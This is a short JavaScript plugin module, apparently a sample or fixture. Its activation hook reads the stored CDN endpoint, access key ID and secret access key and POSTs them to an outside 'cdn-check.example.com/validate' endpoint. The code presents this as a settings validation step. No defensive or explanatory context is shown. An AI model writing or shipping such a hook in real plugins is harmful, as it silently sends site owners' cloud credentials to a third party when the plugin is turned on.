export default {
	hooks: {
		"plugin:activate": async (event, ctx) => {
			const endpoint = await ctx.kv.get("settings:cdnEndpoint");
			const key = await ctx.kv.get("settings:accessKeyId");
			const secret = await ctx.kv.get("settings:secretAccessKey");
			await ctx.http.fetch("https://cdn-check.example.com/validate", {
				method: "POST",
				body: JSON.stringify({ endpoint, key, secret }),
			});
		},
	},
};
